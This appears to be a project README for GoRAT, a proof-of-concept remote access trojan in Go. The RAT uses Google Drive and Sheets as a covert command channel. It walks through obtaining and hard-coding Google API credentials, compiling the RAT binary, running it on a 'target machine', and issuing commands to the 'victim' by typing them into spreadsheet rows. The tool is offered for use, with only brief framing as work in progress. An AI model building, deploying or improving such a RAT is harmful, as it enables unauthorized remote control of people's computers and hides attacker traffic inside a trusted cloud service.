# GoRAT

## What is this?
GoRAT is a (WiP/PoC) RAT in go that uses Google Drive/Sheet APIs to read/write commands to/from the victim. In other words uses Google Drive as a proxy to run commands.

## Options

```
Usage:
  GoRAT [OPTIONS]

Application Options:
      --createsecret=FILE       Create Client Secret: give the path of credentials.json file
      --createrat               Build the RAT based on the API stored in the config folder
      --config=FILE             Path where clients_secret.json and credentials.json are stored (default: cmd/commando/config/gorat)
      --clientsecret=FILE       Path to the client_secret.json file. (default: cmd/commando/config/gorat/client_secret.json)
      --credentialsFile=FILE    Path to the credentials.json file. (default: cmd/commando/config/gorat/credentials.json)

Help Options:
  -h, --help                    Show this help message
```

## Usage
Run the following two commands to get everything you need.
```
go get github.com/litsnarf/GoRAT
go get -u github.com/gobuffalo/packr/...
```

![](poc.gif)


Before you can use the RAT you need to have the file `client_secrets.json` (check the [Create Google User](#4) section at the end). This file contains the API token and other things that will allow the RAT to actually communicate with Google API. If you use the `credentials.json` file (obtained from google when enabling the API) it will require you to always confirm. Since we want to automate the communication, we are going to hard-code this information in the RAT. #TODO: find a better solution?

### Create Google User
- Create a google user
- Follow this guide to get and enable google API: https://developers.google.com/drive/api/v3/quickstart/go
  - Enable Drive API etc...
  - Download Client Configuration file (credentials.json) and save it in the `GoRat/cmd/commando/secrets/[ratname]/credentials.json` file of the project
- Go to: https://console.developers.google.com/apis/api/sheets.googleapis.com
  - Be sure you have selected the correct project in the top left nav-bar
  - Click on "Enable Sheets API"

Once you have the `credentials.json` file saved in the `secrets/[ratname]/` path, you can create the client_secrets.json with 

```
go run GoRAT.go --createsecret [PATH_TO_SECRESTS]/gorat/credentials.json
```

It will ask you to open a link and confirm you are who you claim to be. After that it will return a code that you have to paste in the console.
Once confirmed, if everything works, you should see a list of names. If so, a file `client_secret.json` will be saved in the `secrets/gorat/[ratname]` folder.

From this moment on, you can point to that folder to interact with specific rats or create specific rats.

### Create the rat

You should already have the `client_secret.json` and `credentials.json` in your `config` folder. In order to create a rat that uses this token/session use the following command:

```
go run GoRAT.go --createrat --config [PATH_TO_SECRETS]/gorat/
```
 - `--createrat` tells GoRAT that you want to compile a new RAT
 - `--config` is used to specify the path where to read the tokens

Once you select the target OS, architecture and file name you should see the rat in the `GoRAT/cmd/commando/bin/[filename]` folder. 

Execute it on the target machine and open google drive with the RAT account. A new spreadshee will be generated. 

### Interaction with RAT
In the future GoRAT will be used to interact with the RATs via command line. For now you will have to open Google Drive in your browser (using the RAT account) and open the relative spreadsheet created by the RAT

#### SpreadSheet configuration

 - The first sheet (tab) of the spreadsheet is a summary of the victim information
 - All the remaining sheet can be used to execute commands on the target machine. Simply write the command in the first column and wait for the result.
    - Each sheet should be used by a different person so that you won't mess with other people commands
    - each command should be typed in the next available row (so that you have an history of commands/results) 

## Configuration and structure
```
GoRat (main folder)
    - GoRat.go : main program that allows to create/interact with rats
    - cmd (contains the source code of the rat(s) that will be compiled)
        - commando: this is the actuall Google Drive RAT
            - bin: path where the compiled rats will be saved
    - secrets: the config folder containing all credentials.json and client_secret.json files for different projects and users. Create a folder for each user/project so you can reference them back when creting/interacting with the rat
            

```

## TODOs
- Do not hardcode the API key in the RAT
- Allow setting polling time when compiling the RAT
- Encode/Encrypt all data


## Notes
I'm not a developer, so the code is kinda bad! If you want to help with ideas, improve the project, etc, feel free to ping me.